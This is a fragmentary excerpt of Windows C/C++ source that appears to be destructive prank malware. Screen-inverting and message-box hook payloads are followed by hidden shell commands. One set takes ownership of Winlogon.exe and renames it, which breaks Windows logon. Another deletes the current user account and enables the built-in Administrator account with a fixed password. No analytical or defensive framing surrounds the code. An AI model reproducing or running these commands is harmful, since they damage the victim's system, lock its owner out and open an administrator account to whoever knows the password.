...
int payloadBlink() {
	...
	BitBlt(hdc, 2, 2, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 12, 12, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);
...
DWORD WINAPI messageBoxThread(LPVOID lpstart) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
...
DWORD WINAPI payloadChangeText(LPVOID lpstart) {
...
void something() {
	...
	CreateThread(0, 0, payloadChangeText, 0, 0, 0);
	Sleep(2000);
...
void shit() {
	ShellExecuteA(NULL, NULL, "cmd", "cmd /c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
	ShellExecuteA(NULL, NULL, "cmd", "cmd /c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
}
...
void InEvitableHax() {
	...
	ShellExecuteA(NULL, NULL, "cmd", " cmd /c net user %username% /delete & net user Administrator /active:yes & net user Administrator iwantedthis", NULL, SW_HIDE);
	for (;;) {
		Sleep(10000);
	}
	onceinabluemoon();
